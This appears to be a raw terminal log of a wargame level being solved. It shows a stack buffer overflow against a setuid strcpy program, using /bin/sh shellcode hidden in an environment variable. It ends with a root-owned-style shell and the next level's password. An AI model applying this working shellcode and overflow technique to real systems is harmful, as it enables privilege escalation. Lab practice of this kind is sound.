@@ -1,0 +1,111 @@
+level5@io:~$ cd /levels
+level5@io:/levels$ ls -l | grep level05
+-r-sr-x---  1 level6  level5   7140 Nov 16  2007 level05
+-r-sr-x---  1 level6  level5   8752 Feb 22  2010 level05_alt
+-r--------  1 level5  level5   2954 Feb 24  2010 level05_alt.c
+-r--------  1 level5  level5    178 Oct  4  2007 level05.c
+level5@io:/levels$ cat  level05.c
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+
+	char buf[128];
+
+	if(argc < 2) return 1;
+
+	strcpy(buf, argv[1]);
+
+	printf("%s\n", buf);	
+
+	return 0;
+}
+level5@io:/levels$ file level05
+level05: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.4.1, not stripped
+level5@io:/levels$ cd /tmp
+level5@io:/tmp$ touch test.py
+touch: cannot touch 'test.py': Permission denied
+level5@io:/tmp$ mkdir aaa
+level5@io:/tmp$ cd aaa
+level5@io:/tmp/aaa$ touch test.py
+level5@io:/tmp/aaa$ gedit test.py
+-bash: gedit: command not found
+level5@io:/tmp/aaa$ cat > test.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+		exit(0);
+	}
+	ptr = getenv(argv[1]); /* get env var location */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
+	printf("%s will be at %p\n", argv[1], ptr);
+}
+^C
+level5@io:/tmp/aaa$ ls -l
+total 4
+-rw-r--r-- 1 level5 level5 392 Jun  3 01:51 test.c
+-rw-r--r-- 1 level5 level5   0 Jun  3 01:50 test.py
+level5@io:/tmp/aaa$ gcc test.c -o getenvaddr
+level5@io:/tmp/aaa$ cd /levels
+level5@io:/levels$ printenv
+XDG_SESSION_ID=83563
+TERM=xterm-256color
+SHELL=/bin/bash
+OLDPWD=/tmp/aaa
+SSH_TTY=/dev/pts/13
+USER=level5
+LD_LIBRARY_PATH=/usr/local/radare/lib/
+MAIL=/var/mail/level5
+PATH=/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+PWD=/levels
+LANG=en_GB.UTF-8
+SHLVL=1
+HOME=/home/level5
+LANGUAGE=en_GB:en
+LS_OPTIONS=--color=auto
+LOGNAME=level5
+XDG_RUNTIME_DIR=/run/user/1005
+_=/usr/bin/printenv
+level5@io:/levels$ export PWN=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+level5@io:/levels$ printenv
+XDG_SESSION_ID=83563
+TERM=xterm-256color
+SHELL=/bin/bash
+OLDPWD=/tmp/aaa
+SSH_TTY=/dev/pts/13
+USER=level5
+LD_LIBRARY_PATH=/usr/local/radare/lib/
+MAIL=/var/mail/level5
+PATH=/usr/local/radare/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+PWD=/levels
+LANG=en_GB.UTF-8
+PWN=1�Ph//shh/bin��PS���
+
+SHLVL=1
+HOME=/home/level5
+LANGUAGE=en_GB:en
+LS_OPTIONS=--color=auto
+LOGNAME=level5
+XDG_RUNTIME_DIR=/run/user/1005
+_=/usr/bin/printenv
+level5@io:/levels$ ls -la /tmp/aaa/
+total 48
+drwxr-xr-x   2 level5 level5  4096 Jun  3 01:51 .
+drwx-wx-wt 423 root   root   28672 Jun  3 01:50 ..
+-rwxr-xr-x   1 level5 level5  7528 Jun  3 01:51 getenvaddr
+-rw-r--r--   1 level5 level5   392 Jun  3 01:51 test.c
+-rw-r--r--   1 level5 level5     0 Jun  3 01:50 test.py
+level5@io:/levels$ /tmp/aaa/getenvaddr PWN ./level05
+PWN will be at 0xbfffff5c
+level5@io:/levels$ ./level05 $(python -c "print 'A' * 140 + '\x5c\xff\xff\xbf'")
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\���
+sh-4.3$ cd /home/level6/
+sh-4.3$ cat .pass 
+fQ8W8YlSBJBWKV2R
+sh-4.3$ 
